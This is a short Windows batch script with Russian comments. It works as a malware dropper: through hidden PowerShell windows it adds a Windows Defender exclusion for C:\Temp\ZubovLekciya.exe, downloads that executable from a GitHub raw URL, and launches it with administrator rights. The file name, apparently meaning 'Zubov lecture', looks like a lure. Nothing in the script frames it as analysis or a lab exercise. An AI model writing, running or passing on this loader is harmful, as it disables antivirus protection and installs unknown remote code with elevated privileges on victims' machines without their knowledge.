@echo off
set "FilePath=C:\Temp\ZubovLekciya.exe"
set "URL=https://github.com/Crowly-AI/Hello-World/raw/refs/heads/main/ZubovLekciya.exe"

:: Добавление файла в исключения Defender
powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath "%FilePath%"

:: Скачивание файла
powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source '%URL%' -Destination '%FilePath%'}"

:: Запуск файла от имени администратора
powershell -WindowStyle Hidden -Command Start-Process "%FilePath%" -Verb RunAs
